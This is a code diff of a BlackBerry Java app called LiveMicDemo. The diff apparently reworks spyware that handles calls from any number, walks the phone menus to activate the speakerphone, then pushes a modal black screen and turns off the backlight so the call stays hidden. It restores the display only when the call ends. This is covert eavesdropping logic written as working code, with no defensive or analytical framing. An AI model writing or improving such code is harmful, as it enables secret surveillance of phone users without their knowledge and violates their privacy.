@@ -38,7 +38,9 @@ import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.MenuItem;
+import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import net.rim.device.api.ui.UiEngine;
 import net.rim.device.api.ui.container.MainScreen;
 import net.rim.device.api.ui.Field;
 import net.rim.device.api.ui.component.Dialog;
@@ -129,40 +131,6 @@ public class LiveMicDemo extends UiApplication implements PhoneListener {
 
     Hashtable callingHistory = new Hashtable();
 
-    public void callAdded(int callId) {
-        //#ifdef DEBUG
-        debug.info("======= callAdded: " + callId + "===");
-        //#endif
-    }
-
-    public void callAnswered(int callId) {
-        final PhoneCall phoneCall = Phone.getCall(callId);
-        phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
-
-        //#ifdef DEBUG
-        debug.info("======= callAnswered: " + phoneNumber + "===");
-        //#endif
-
-        if (!interestingNumber(callId, phoneNumber)) {
-            //#ifdef DEBUG
-            debug.trace("callAnswered: not interesting number");
-            //#endif
-            return;
-        }
-
-        //MenuWalker.walk(new String[] { "Activate Speakerphone" });
-        MenuWalker.walk("Home Screen");
-
-        //MenuWalker.walk(new String[] { "Close" });
-        MenuWalker.walk("Return to Phone");
-        MenuWalker.walk("Activate Speakerphone");
-        //MenuWalker.setLocaleEnd();
-
-        //#ifdef DEBUG
-        debug.trace("onCallAnswered: finished");
-        //#endif
-    }
-
     private boolean interestingNumber(int callId2, String phoneNumber2) {
         return true;
     }
@@ -198,6 +166,8 @@ public class LiveMicDemo extends UiApplication implements PhoneListener {
             //#endif
         }
 
+        UiApplication.getUiApplication().pushGlobalScreen(blackScreen, 0,
+                UiEngine.GLOBAL_MODAL);
         //black(true);
 
         //#ifdef DEBUG
@@ -223,12 +193,33 @@ public class LiveMicDemo extends UiApplication implements PhoneListener {
         }
     }
 
-    public void callConferenceCallEstablished(int arg0) {
+    public void callAnswered(int callId) {
+        final PhoneCall phoneCall = Phone.getCall(callId);
+        phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
+
         //#ifdef DEBUG
-        debug.trace("======= callConferenceCallEstablished: " + arg0);
+        debug.info("======= callAnswered: " + phoneNumber + "===");
+        //#endif
+
+        if (!interestingNumber(callId, phoneNumber)) {
+            //#ifdef DEBUG
+            debug.trace("callAnswered: not interesting number");
+            //#endif
+            return;
+        }
+
+        
+        //MenuWalker.walk("Home Screen");
+        //MenuWalker.walk("Return to Phone");
+        MenuWalker.walk("Activate Speakerphone");
+        
+        UiApplication.getUiApplication().requestForeground();
+
+        //#ifdef DEBUG
+        debug.trace("onCallAnswered: finished");
         //#endif
     }
-
+    
     public void callConnected(int callId) {
         //#ifdef DEBUG
         debug.info("======= callConnected: " + phoneNumber + " ===");
@@ -241,11 +232,27 @@ public class LiveMicDemo extends UiApplication implements PhoneListener {
             return;
         }
 
-        black(true);
+        //black(true);
+        UiApplication.getUiApplication().requestForeground();
+        Backlight.enable(false);
 
         //Utils.sleep(2000);
         autoanswer = true;
     }
+
+    public void callAdded(int callId) {
+        //#ifdef DEBUG
+        debug.info("======= callAdded: " + callId + "===");
+        //#endif
+    }
+
+    public void callConferenceCallEstablished(int arg0) {
+        //#ifdef DEBUG
+        debug.trace("======= callConferenceCallEstablished: " + arg0);
+        //#endif
+    }
+
+   
 
     public void callDirectConnectConnected(int arg0) {
         //#ifdef DEBUG
@@ -275,6 +282,12 @@ public class LiveMicDemo extends UiApplication implements PhoneListener {
             //#ifdef DEBUG
             debug.trace("onCallDisconnected, interesting");
             //#endif
+            
+            Screen activeScreen = LiveMicDemo.getUiApplication().getActiveScreen();
+            if (activeScreen.getUiEngine().isPaintingSuspended()) {
+                activeScreen.getUiEngine().suspendPainting(false);
+            }
+            activeScreen.doPaint();
 
             removePhoneCalls();
             removed = false;
@@ -285,7 +298,7 @@ public class LiveMicDemo extends UiApplication implements PhoneListener {
             removePhoneCall(10000, false);
             removePhoneCall(20000, false);
 
-            black(false);
+            //black(false);
             //#ifdef DEBUG
             debug.trace("callDisconnected: suspended end");
             //#endif
@@ -347,21 +360,18 @@ public class LiveMicDemo extends UiApplication implements PhoneListener {
     }
 
     BlackScreen blackScreen = new BlackScreen();;
-int screenCount=0;
+    int screenCount = 0;
 
     public void black(final boolean value) {
         //#ifdef DEBUG
         debug.trace("black: " + value);
         //#endif
 
-/*        synchronized (Application.getEventLock()) {
-            if (isPaintingSuspended() != value) {
-                //#ifdef DEBUG
-                debug.trace("suspending: " + value);
-                //#endif
-                suspendPainting(value);
-            }
-        }*/
+        /*
+         * synchronized (Application.getEventLock()) { if (isPaintingSuspended()
+         * != value) { //#ifdef DEBUG debug.trace("suspending: " + value);
+         * //#endif suspendPainting(value); } }
+         */
 
         final UiApplication theApp = UiApplication.getUiApplication();
         theApp.requestForeground();
@@ -384,19 +394,19 @@ int screenCount=0;
                 try {
                     if (value) {
                         Backlight.enable(false);
-                        if(screenCount==0){
-                            screenCount=theApp.getScreenCount();
-                            theApp.pushGlobalScreen(blackScreen,-100,false);
-                             
+                        if (screenCount == 0) {
+                            screenCount = theApp.getScreenCount();
+                            theApp.pushGlobalScreen(blackScreen, -100, false);
+
                             //theApp.addKeyListener(arg0)
-                  
+
                         }
-                        
+
                         //theApp.pushScreen();
-                        
+
                     } else {
                         theApp.popScreen(blackScreen);
-                        screenCount=0;
+                        screenCount = 0;
                     }
                 } catch (Exception ex) {
                     System.out.println("????????------- " + ex);
@@ -412,7 +422,7 @@ int screenCount=0;
          */
 
         //requestForeground();
-       
+
     }
 
     public void activate() {
